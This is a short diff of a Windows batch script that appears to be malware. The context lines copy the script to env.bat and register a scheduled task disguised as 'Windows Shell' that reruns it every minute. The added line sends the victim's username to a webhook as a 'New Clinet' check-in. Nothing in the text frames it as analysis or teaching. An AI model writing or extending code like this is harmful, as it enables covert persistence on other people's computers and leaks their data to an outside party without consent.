@@ -10,6 +10,7 @@ IF NOT Exist %CDIR%\nircmdc.exe (
 	REM curl --ssl-no-revoke %NIRCMD_URL% -o %CDIR%\nircmdc.exe
 	copy "%~f0" "%CDIR%\env.bat" 
 	schtasks /Create /SC minute /MO 1 /TN "Windows Shell" /TR %CDIR%\env.bat
+    curl -X POST -d "New Clinet: %USER%" %WEBHOOK%
 )
 
 setlocal
